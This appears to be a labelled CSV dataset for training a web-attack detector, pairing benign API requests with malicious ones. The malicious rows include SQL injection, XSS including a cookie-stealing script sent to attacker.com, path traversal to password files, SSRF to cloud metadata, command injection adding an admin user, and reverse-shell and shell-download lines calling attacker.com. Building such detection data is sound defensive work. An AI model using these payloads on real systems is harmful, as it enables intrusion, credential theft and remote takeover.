"text","label"
"order_id=ORD-5139 status=confirmed","0"
"GET /health HTTP/1.1","0"
"search=headphones","0"
"POST /api/orders body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET ../../../etc/shadow","1"
"login attempt failed username admin invalid credentials","1"
"include=../../../../etc/passwd","1"
"multiple failed login attempts detected for admin","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"page=11&limit=20","0"
"Authorization: Bearer validtoken940","0"
"POST /api/orders?date=2024-01-15&type=order","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"category=phones page=10","0"
"page=31&limit=50","0"
"brute force attempt on login endpoint from single ip","1"
"search=headphones","0"
"order_id=ORD-2495 status=confirmed","0"
"file=../../../etc/shadow","1"
"GET /health HTTP/1.1","0"
"page=38&limit=10","0"
"url=dict://127.0.0.1:11211/","1"
"name=Sara email=307@mail.com","0"
"page=30&limit=20","0"
"POST /api/login body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"comment=<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>","1"
"POST /api/login body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"POST /api/users body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"page=9&limit=10","0"
"id=123&format=json","0"
"POST /settings User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"user=ahmed&filter=active","0"
"Authorization: Bearer validtoken620","0"
"page=47&limit=50","0"
"POST /api/data body=command& net user hacker Password1 /add","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"id=1' OR '1'='1' /*","1"
"POST /api/login username=' OR '1'='1'-- password=test","1"
"PUT /profile User-Agent: axios/1.6.0","0"
"search=tablet","0"
"page=17&limit=20","0"
"name=<script>alert(1)</script>","1"
"....//....//etc/passwd","1"
"url=http://metadata.google.internal","1"
"category=audio page=2","0"
"GET /config.php HTTP/1.1","1"
"POST /api/login body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"cmd=& ipconfig","1"
"password spray attack detected multiple users","1"
"url=http://192.168.1.1","1"
"page=40&limit=50","0"
"POST /api/users?id=123&format=json","0"
"username=root&password=123456","1"
"page=46&limit=10","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=' OR 1=1 LIMIT 1--","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"username=user&password=admin123","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"POST /dashboard body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"file=../../../../etc/passwd","1"
"username=admin&password=admin123","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"Authorization: Bearer validtoken361","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"POST /settings User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"User-Agent: Nikto/2.5.0","1"
"POST /api/feedback body=<ScRiPt>alert(1)</ScRiPt>","1"
"search=tablet","0"
"order_id=ORD-1307 status=confirmed","0"
"user_id=144&action=view","0"
"order_id=1' OR '1'='1' /*","1"
"id=1'	OR	1=1--","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"name=Sara email=569@mail.com","0"
"host=& net user hacker Password1 /add","1"
"page=35&limit=50","0"
"POST /api/login body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/products User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"GET /api/users?id=' UNION ALL SELECT NULL,NULL,NULL--","1"
"search=' OR 'x'='x","1"
"host=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"POST /api/login body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"ping=| cat /etc/passwd","1"
"user=1; IF (1=1) WAITFOR DELAY '0:0:5'--","1"
"message=<script >alert(1)</script >","1"
"name=Lina email=335@mail.com","0"
"POST /api/data User-Agent: python-requests/2.31.0","0"
"POST /profile body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"PUT /api/login?limit=20&offset=0","0"
"POST /api/orders body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/files?name=file:///etc/passwd","1"
"GET /web.config HTTP/1.1","1"
"fetch=http://internal-service:8080/secret","1"
"category=laptops page=10","0"
"search=<iframe src=javascript:alert(1)>","1"
"login attempt failed username admin invalid credentials","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"comment=<script>alert(1)</script>","1"
"file=../../.git/config","1"
"GET /health HTTP/1.1","0"
"POST /api/login body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"order_id=ORD-9806 status=confirmed","0"
"GET /api/login?id=123&format=json","0"
"description=<a href='javascript:alert(1)'>click</a>","1"
"file=../../../etc/shadow","1"
"....//....//etc/passwd","1"
"url=http://192.168.1.1","1"
"GET /config.php HTTP/1.1","1"
"url=http://localhost:8080","1"
"DELETE /profile?status=pending&priority=high","0"
"user=1'/**/OR/**/1=1--","1"
"name=Omar email=852@mail.com","0"
"user_id=58&action=view","0"
"description=<a href='javascript:alert(1)'>click</a>","1"
"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"User-Agent: Nikto/2.5.0","1"
"username=admin&password=batman","1"
"search=laptop","0"
"<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"GET /dashboard/1187","0"
"GET /api/swagger.json HTTP/1.1","1"
"GET /api/orders User-Agent: python-requests/2.31.0","0"
"GET /dashboard?user=ahmed&filter=active","0"
"exec=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"order_id=ORD-3498 status=confirmed","0"
"url=http://localhost:8080","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"GET ../../../etc/shadow","1"
"id=1' /*!OR*/ 1=1--","1"
"GET /health HTTP/1.1","0"
"GET ....//....//etc/passwd","1"
"category=laptops page=3","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"user_id=729&action=view","0"
"category=electronics&page=1","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"POST /settings?category=electronics&page=1","0"
"order_id=ORD-2092 status=confirmed","0"
"search=laptop&sort=price","0"
"name=Ahmed email=616@mail.com","0"
"host=& net user hacker Password1 /add","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"user=ahmed&filter=active","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"category=audio page=6","0"
"date=2024-01-15&type=order","0"
"POST /api/login username=') OR ('1'='1 password=test","1"
"file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"password spray attack detected multiple users","1"
"name=Lina email=381@mail.com","0"
"category=phones page=3","0"
"GET /api/products/7540","0"
"POST /api/products body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"repeated authentication failure admin account locked","1"
"GET /server-status HTTP/1.1","1"
"category=tablets page=3","0"
"POST /api/products User-Agent: PostmanRuntime/7.36.0","0"
"category=tablets page=7","0"
"login attempt failed username admin invalid credentials","1"
"category=laptops page=10","0"
"name=Sara email=480@mail.com","0"
"PUT /api/search User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"path=../../../../etc/shadow","1"
"GET /api/orders User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"host=`id`","1"
"name=Nour email=888@mail.com","0"
"search=laptop&sort=price","0"
"PUT /api/products User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"category=tablets page=4","0"
"name=Lina email=767@mail.com","0"
"POST /api/orders body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"message=<script>alert(document.cookie)</script>","1"
"page=34&limit=10","0"
"search=phone","0"
"GET /profile?q=smartphone&brand=samsung","0"
"user=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","1"
"username=administrator&password=admin","1"
"limit=20&offset=0","0"
"username=administrator&password=batman","1"
"GET /dashboard/2090","0"
"order_id=ORD-5006 status=confirmed","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"include=../../../../etc/passwd","1"
"user_id=874&action=view","0"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"url=dict://127.0.0.1:11211/","1"
"search=' UNION SELECT NULL,NULL--","1"
"name=Nour email=296@mail.com","0"
"' UNION SELECT NULL--","1"
"GET /backup.sql HTTP/1.1","1"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /api/swagger.json HTTP/1.1","1"
"search='><script>alert(1)</script>","1"
"Authorization: Bearer validtoken125","0"
"GET /health HTTP/1.1","0"
"date=2024-01-15&type=order","0"
"POST /api/orders body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /console HTTP/1.1","1"
"$(curl -s http://attacker.com/shell.sh)","1"
"GET /api/search?q=""><script>alert(1)</script>","1"
"name=Ahmed email=503@mail.com","0"
"order_id=ORD-8256 status=confirmed","0"
"category=audio page=9","0"
"page=39&limit=10","0"
"1' AND 1=1 UNION SELECT 1-- -","1"
"page=10&limit=20","0"
"search=headphones","0"
"GET /api/login User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"POST /api/orders User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"page=5&limit=10","0"
"url=file:///etc/passwd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=dict://127.0.0.1:11211/","1"
"POST /api/data body=command| wget http://attacker.com/shell.sh","1"
"POST /dashboard User-Agent: python-requests/2.31.0","0"
"category=phones page=8","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"category=audio page=10","0"
"url=file:///etc/passwd","1"
"repeated authentication failure admin account locked","1"
"path=../../../../proc/self/environ","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"user_id=37&action=view","0"
"page=41&limit=10","0"
"GET /health HTTP/1.1","0"
"search=laptop","0"
"DELETE /profile User-Agent: axios/1.6.0","0"
"category=tablets page=1","0"
"GET /api/search?q=<ScRiPt>alert(1)</ScRiPt>","1"
"user_id=572&action=view","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"include=....//....//etc/passwd","1"
"POST /api/users body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"search=phone","0"
"order_id=ORD-6253 status=confirmed","0"
"search=phone","0"
"POST /api/login body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"file=/etc/passwd%00","1"
"search=1 AND SLEEP(5)--","1"
"GET /api/orders/2799","0"
"search=phone","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"search=headphones","0"
"username=admin&password=admin","1"
"GET /api/products/481","0"
"GET /backup.sql HTTP/1.1","1"
"search=' UNION SELECT username,password FROM users--","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=tablet","0"
"url=http://192.168.1.1","1"
"category=electronics&page=1","0"
"username=1 UNION SELECT 1,2,3--","1"
"search=tablet","0"
"1; DROP TABLE users--","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/login User-Agent: axios/1.6.0","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"description=javascript:alert(1)","1"
"order_id=ORD-1582 status=confirmed","0"
"Authorization: Bearer validtoken376","0"
"exec=$(whoami)","1"
"GET /api/data/2302","0"
"search=laptop&sort=price","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"user=ahmed&filter=active","0"
"search=tablet","0"
"POST /profile body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"id=1'	OR	1=1--","1"
"user_id=341&action=view","0"
"GET /api/files?name=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"POST /profile body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"include=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"GET /admin HTTP/1.1","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/search?q=<scr ipt>alert(1)</scr ipt>","1"
"Authorization: Bearer validtoken766","0"
"name=Omar email=949@mail.com","0"
"order_id=ORD-5701 status=confirmed","0"
"GET /api/search?q=<div onmouseover=alert(1)>hover</div>","1"
"GET /dashboard/291","0"
"status=pending&priority=high","0"
"user_id=35&action=view","0"
"POST /api/data body=command& net user hacker Password1 /add","1"
"user_id=873&action=view","0"
"user_id=502&action=view","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"DELETE /api/search User-Agent: PostmanRuntime/7.36.0","0"
"user_id=578&action=view","0"
"date=2024-01-15&type=order","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"message=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /robots.txt scan probe reconnaissance","1"
"user_id=684&action=view","0"
"username=administrator&password=abc123","1"
"category=audio page=1","0"
"GET /api/users?id=admin'--","1"
"user_id=488&action=view","0"
"../../../.env","1"
"multiple failed login attempts detected for admin","1"
"user_id=249&action=view","0"
"user_id=273&action=view","0"
"PUT /api/products?category=electronics&page=1","0"
"GET /health HTTP/1.1","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"path=php://filter/convert.base64-encode/resource=config.php","1"
"user=' UNION SELECT NULL,NULL--","1"
"Authorization: Bearer validtoken197","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"search=tablet","0"
"../../../../proc/self/environ","1"
"comment=<scr ipt>alert(1)</scr ipt>","1"
"GET /actuator/env HTTP/1.1","1"
"brute force attempt on login endpoint from single ip","1"
"search=phone","0"
"category=audio page=2","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=http://127.0.0.1/admin","1"
"category=audio page=3","0"
"1 UNION SELECT 1,2,3--","1"
"cmd=| cat /etc/passwd","1"
"url=gopher://127.0.0.1:25/","1"
"host=$(curl -s http://attacker.com/shell.sh)","1"
"category=electronics&page=1","0"
"order_id=1 UNION SELECT 1,2,3--","1"
"POST /api/search body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"search=headphones","0"
"PUT /api/login User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"search=headphones","0"
"message=<div onmouseover=alert(1)>hover</div>","1"
"GET /backup.sql HTTP/1.1","1"
"GET /api/users/3622","0"
"message=javascript:alert(document.cookie)","1"
"Authorization: Bearer validtoken706","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /server-status HTTP/1.1","1"
"User-Agent: Nikto/2.5.0","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=file:///etc/passwd","1"
"GET /admin HTTP/1.1","1"
"search=laptop&sort=price","0"
"page=3&limit=50","0"
